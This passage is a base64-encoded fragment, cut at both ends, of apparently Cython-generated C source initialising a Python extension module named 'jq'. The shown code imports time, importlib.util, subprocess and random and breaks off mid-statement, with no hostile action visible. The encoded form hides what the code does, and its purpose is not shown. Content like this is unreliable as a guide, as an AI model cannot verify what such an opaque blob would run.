fc2xvdHMsIFxuICAgICNlbHNlXG4gICAgICBOVUxMLCBcbiAgICAjZW5kaWZcbiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgICAgIF9fcHl4X21fdHJhdmVyc2UsIFxuICAgICAgX19weXhfbV9jbGVhciwgXG4gICAgICBOVUxMIFxuICAgICNlbHNlXG4gICAgICBOVUxMLCBcbiAgICAgIE5VTEwsIFxuICAgICAgTlVMTCBcbiAgICAjZW5kaWZcbiAgfTtcbiAgI2lmZGVmIF9fY3BsdXNwbHVzXG59IFxuI2VuZGlmXG5cblxuI2lmbmRlZiBDWVRIT05fTk9fUFlJTklUX0VYUE9SVFxuICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5TU9ESU5JVF9GVU5DXG4jZWxzZVxuICAjaWZkZWYgX19jcGx1c3BsdXNcbiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBleHRlcm4gIkMiIFB5T2JqZWN0ICpcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBQeU9iamVjdCAqXG4gICNlbmRpZlxuI2VuZGlmXG5cbl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9qcSh2b2lkKSBDWVRIT05fU01BTExfQ09ERTsgXG5fX1B5eF9QeU1PRElOSVRfRlVOQyBQeUluaXRfanEodm9pZClcbiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbntcbiAgcmV0dXJuIFB5TW9kdWxlRGVmX0luaXQoJl9fcHl4X21vZHVsZWRlZik7XG59XG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG5zdGF0aWMgUFlfSU5UNjRfVCBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCh2b2lkKSB7XG4gICAge1xuICAgICAgICBQeU9iamVjdCAqbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJfaW50ZXJwcmV0ZXJzIik7IC8vIDMuMTMrIEkgdGhpbmtcbiAgICAgICAgaWYgKCFtb2R1bGUpIHtcbiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7IC8vIGp1c3QgdHJ5IHRoZSAzLjgtMy4xMiB2ZXJzaW9uXG4gICAgICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoIl94eHN1YmludGVycHJldGVycyIpO1xuICAgICAgICAgICAgaWYgKCFtb2R1bGUpIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIFB5T2JqZWN0ICpjdXJyZW50ID0gUHlPYmplY3RfQ2FsbE1ldGhvZChtb2R1bGUsICJnZXRfY3VycmVudCIsIE5VTEwpO1xuICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTtcbiAgICAgICAgaWYgKCFjdXJyZW50KSBnb3RvIGJhZDtcbiAgICAgICAgaWYgKFB5VHVwbGVfQ2hlY2soY3VycmVudCkpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpuZXdfY3VycmVudCA9IFB5U2VxdWVuY2VfR2V0SXRlbShjdXJyZW50LCAwKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihjdXJyZW50KTtcbiAgICAgICAgICAgIGN1cnJlbnQgPSBuZXdfY3VycmVudDtcbiAgICAgICAgICAgIGlmICghbmV3X2N1cnJlbnQpIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIGxvbmcgbG9uZyBhc19jX2ludCA9IFB5TG9uZ19Bc0xvbmdMb25nKGN1cnJlbnQpO1xuICAgICAgICBQeV9ERUNSRUYoY3VycmVudCk7XG4gICAgICAgIHJldHVybiBhc19jX2ludDtcbiAgICB9XG4gIGJhZDpcbiAgICBQeVN5c19Xcml0ZVN0ZGVycigiX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQgZmFpbGVkLiBUcnkgc2V0dGluZyB0aGUgQyBkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUPTBcXG4iKTtcbiAgICByZXR1cm4gLTE7XG59XG4jZW5kaWZcbiNpZiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKHZvaWQpIHtcbiAgICBzdGF0aWMgUFlfSU5UNjRfVCBtYWluX2ludGVycHJldGVyX2lkID0gLTE7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJREZyb21UaHJlYWRTdGF0ZShQeVRocmVhZFN0YXRlX0dldCgpKTtcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4gICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQoKTtcbiNlbHNlXG4gICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycCk7XG4jZW5kaWZcbiAgICBpZiAodW5saWtlbHkoY3VycmVudF9pZCA9PSAtMSkpIHtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBpZiAobWFpbl9pbnRlcnByZXRlcl9pZCA9PSAtMSkge1xuICAgICAgICBtYWluX2ludGVycHJldGVyX2lkID0gY3VycmVudF9pZDtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShtYWluX2ludGVycHJldGVyX2lkICE9IGN1cnJlbnRfaWQpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhcbiAgICAgICAgICAgIFB5RXhjX0ltcG9ydEVycm9yLFxuICAgICAgICAgICAgIkludGVycHJldGVyIGNoYW5nZSBkZXRlY3RlZCAtIHRoaXMgbW9kdWxlIGNhbiBvbmx5IGJlIGxvYWRlZCBpbnRvIG9uZSBpbnRlcnByZXRlciBwZXIgcHJvY2Vzcy4iKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKFB5T2JqZWN0ICpzcGVjLCBQeU9iamVjdCAqbW9kZGljdCwgY29uc3QgY2hhciogZnJvbV9uYW1lLCBjb25zdCBjaGFyKiB0b19uYW1lLCBpbnQgYWxsb3dfbm9uZSlcbntcbiAgICBQeU9iamVjdCAqdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHNwZWMsIGZyb21fbmFtZSk7XG4gICAgaW50IHJlc3VsdCA9IDA7XG4gICAgaWYgKGxpa2VseSh2YWx1ZSkpIHtcbiAgICAgICAgaWYgKGFsbG93X25vbmUgfHwgdmFsdWUgIT0gUHlfTm9uZSkge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW1TdHJpbmcobW9kZGljdCwgdG9fbmFtZSwgdmFsdWUpO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRih2YWx1ZSk7XG4gICAgfSBlbHNlIGlmIChQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkge1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJlc3VsdCA9IC0xO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpIHtcbiAgICBQeU9iamVjdCAqbW9kdWxlID0gTlVMTCwgKm1vZGRpY3QsICptb2RuYW1lO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGRlZik7XG4gICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgIGlmIChfX1B5eF9jaGVja19zaW5nbGVfaW50ZXJwcmV0ZXIoKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgI2VuZGlmXG4gICAgaWYgKF9fcHl4X20pXG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7XG4gICAgbW9kbmFtZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgIm5hbWUiKTtcbiAgICBpZiAodW5saWtlbHkoIW1vZG5hbWUpKSBnb3RvIGJhZDtcbiAgICBtb2R1bGUgPSBQeU1vZHVsZV9OZXdPYmplY3QobW9kbmFtZSk7XG4gICAgUHlfREVDUkVGKG1vZG5hbWUpO1xuICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkgZ290byBiYWQ7XG4gICAgbW9kZGljdCA9IFB5TW9kdWxlX0dldERpY3QobW9kdWxlKTtcbiAgICBpZiAodW5saWtlbHkoIW1vZGRpY3QpKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAibG9hZGVyIiwgIl9fbG9hZGVyX18iLCAxKSA8IDApKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAib3JpZ2luIiwgIl9fZmlsZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInBhcmVudCIsICJfX3BhY2thZ2VfXyIsIDEpIDwgMCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJzdWJtb2R1bGVfc2VhcmNoX2xvY2F0aW9ucyIsICJfX3BhdGhfXyIsIDApIDwgMCkpIGdvdG8gYmFkO1xuICAgIHJldHVybiBtb2R1bGU7XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihtb2R1bGUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfcHltb2RfZXhlY19qcShQeU9iamVjdCAqX19weXhfcHlpbml0X21vZHVsZSlcbiNlbmRpZlxue1xuICBpbnQgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMDtcbiAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gIGludCBweXN0YXRlX2FkZG1vZHVsZV9ydW4gPSAwO1xuICAjZW5kaWZcbiAgX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTJbNF07XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNVs4XTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTZbM107XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE3WzZdO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgaWYgKF9fcHl4X20pIHtcbiAgICBpZiAoX19weXhfbSA9PSBfX3B5eF9weWluaXRfbW9kdWxlKSByZXR1cm4gMDtcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiTW9kdWxlIFwnanFcJyBoYXMgYWxyZWFkeSBiZWVuIGltcG9ydGVkLiBSZS1pbml0aWFsaXNhdGlvbiBpcyBub3Qgc3VwcG9ydGVkLiIpO1xuICAgIHJldHVybiAtMTtcbiAgfVxuICAjZWxzZVxuICBpZiAoX19weXhfbSkgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tKTtcbiAgI2VuZGlmXG4gIFxuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIF9fcHl4X3RfMSA9IF9fcHl4X3B5aW5pdF9tb2R1bGU7XG4gIFB5X0lOQ1JFRihfX3B5eF90XzEpO1xuICAjZWxzZVxuICBfX3B5eF90XzEgPSBQeU1vZHVsZV9DcmVhdGUoJl9fcHl4X21vZHVsZWRlZik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gIHtcbiAgICBpbnQgYWRkX21vZHVsZV9yZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoX19weXhfdF8xLCAmX19weXhfbW9kdWxlZGVmKTtcbiAgICBfX3B5eF90XzEgPSAwOyBcbiAgICBpZiAodW5saWtlbHkoKGFkZF9tb2R1bGVfcmVzdWx0IDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICAgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMTtcbiAgfVxuICAjZWxzZVxuICBfX3B5eF9tID0gX19weXhfdF8xO1xuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gIFB5VW5zdGFibGVfTW9kdWxlX1NldEdJTChfX3B5eF9tLCBQeV9NT0RfR0lMX1VTRUQpO1xuICAjZW5kaWZcbiAgX19weXhfbXN0YXRlID0gX19weXhfbXN0YXRlX2dsb2JhbDtcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdF8xKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9kID0gUHlNb2R1bGVfR2V0RGljdChfX3B5eF9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2QpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIFB5X0lOQ1JFRihfX3B5eF9tc3RhdGUtPl9fcHl4X2QpO1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2IgPSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9iKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKCJjeXRob25fcnVudGltZSIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChQeU9iamVjdF9TZXRBdHRyU3RyaW5nKF9fcHl4X20sICJfX2J1aWx0aW5zX18iLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2IpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBcbiAgI2lmIENZVEhPTl9SRUZOQU5OWVxuX19QeXhfUmVmTmFubnkgPSBfX1B5eF9SZWZOYW5ueUltcG9ydEFQSSgicmVmbmFubnkiKTtcbmlmICghX19QeXhfUmVmTmFubnkpIHtcbiAgUHlFcnJfQ2xlYXIoKTtcbiAgX19QeXhfUmVmTmFubnkgPSBfX1B5eF9SZWZOYW5ueUltcG9ydEFQSSgiQ3l0aG9uLlJ1bnRpbWUucmVmbmFubnkiKTtcbiAgaWYgKCFfX1B5eF9SZWZOYW5ueSlcbiAgICAgIFB5X0ZhdGFsRXJyb3IoImZhaWxlZCB0byBpbXBvcnQgXCdyZWZuYW5ueVwnIG1vZHVsZSIpO1xufVxuI2VuZGlmXG5cbl9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJQeUluaXRfanEiLCAwKTtcbiAgaWYgKF9fUHl4X2NoZWNrX2JpbmFyeV92ZXJzaW9uKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVgsIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2lmZGVmIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzXG4gIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKCk7XG4gICNlbmRpZlxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlID0gUHlUdXBsZV9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiIiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBcbiAgaWYgKF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAxO1xuICBpZiAoX19QeXhfSW5pdEdsb2JhbHMoKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjaWYgMCB8fCBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQ29yb3V0aW5lX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfR2VuZXJhdG9yX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRClcbiAgaWYgKF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRURcbiAgaWYgKF9fcHl4X0N5RnVuY3Rpb25faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRFxuICBpZiAoX19weXhfRnVzZWRGdW5jdGlvbl9pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgaWYgKF9fcHl4X0Nvcm91dGluZV9pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgaWYgKF9fcHl4X0dlbmVyYXRvcl9pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICBpZiAoX19weXhfQXN5bmNHZW5faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgXG4gIGlmIChfX3B5eF9tb2R1bGVfaXNfbWFpbl9qcSkge1xuICAgIGlmIChQeU9iamVjdF9TZXRBdHRyKF9fcHl4X20sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lXzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICB9XG4gIHtcbiAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTsgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIGlmICghUHlEaWN0X0dldEl0ZW1TdHJpbmcobW9kdWxlcywgImpxIikpIHtcbiAgICAgIGlmICh1bmxpa2VseSgoUHlEaWN0X1NldEl0ZW1TdHJpbmcobW9kdWxlcywgImpxIiwgX19weXhfbSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9XG4gIH1cbiAgXG4gIGlmIChfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBcbiAgaWYgKF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGUpO1xuICBpZiAodW5saWtlbHkoKF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRlKSA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAodm9pZClfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpO1xuICAodm9pZClfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gIFxuXG4gIFxuICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWJfdXRpbCwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWIsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VicHJvY2VzcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdWJwcm9jZXNzLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0